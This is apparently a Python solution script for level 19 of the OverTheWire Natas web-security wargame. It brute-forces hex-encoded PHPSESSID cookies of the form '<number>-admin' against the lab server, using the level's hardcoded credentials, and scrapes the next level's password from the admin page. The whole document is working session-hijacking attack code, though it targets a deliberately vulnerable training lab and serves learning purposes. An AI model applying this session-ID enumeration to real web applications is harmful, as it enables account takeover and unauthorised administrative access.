#!/usr/local/bin/python3
import requests
import re
import codecs

username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.session()

# response = requests.get(url, auth=(username, password), data={"username": "", "password": "hola"}, cookies={'PHPSESSID': "12"})
# content = response.text
# print(response.text)


for i in range(0, 641):
    sess_id = str(codecs.encode(b'%i-admin' % i, "hex"), 'ascii')
    response = requests.get(url, auth=(username, password), data={"username": "", "password": ""}, cookies={"PHPSESSID": sess_id})
    content = response.text
    print('trying: ' + sess_id)
    if "You are an admin" in content:
        print("Password for natas 20 is " + re.findall('Password: (.*)</pre', content)[0])
        break
